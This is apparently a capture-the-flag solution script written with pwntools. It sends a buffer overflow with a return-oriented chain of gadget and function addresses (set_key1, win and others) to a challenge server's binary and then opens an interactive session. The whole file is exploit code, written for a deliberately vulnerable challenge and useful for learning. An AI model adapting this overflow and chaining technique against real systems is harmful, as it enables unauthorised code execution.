from pwn import *

bin = "./calling_convention"
elf = context.binary = ELF(bin)
#p = process(bin)
p = remote('chal.bearcatctf.io', 39440)

offset = 16
payload = b'A'*offset 
#set key3
#set key1
payload += p64(0x000000000040101a) # ret gadget
payload += p64(elf.sym['food']) + p64(elf.sym['set_key1'])
payload += p64(elf.sym['number3']) + p64(elf.sym['ahhhhhhhh']) + p64(elf.sym['win'])
p.sendline(payload)
p.interactive()
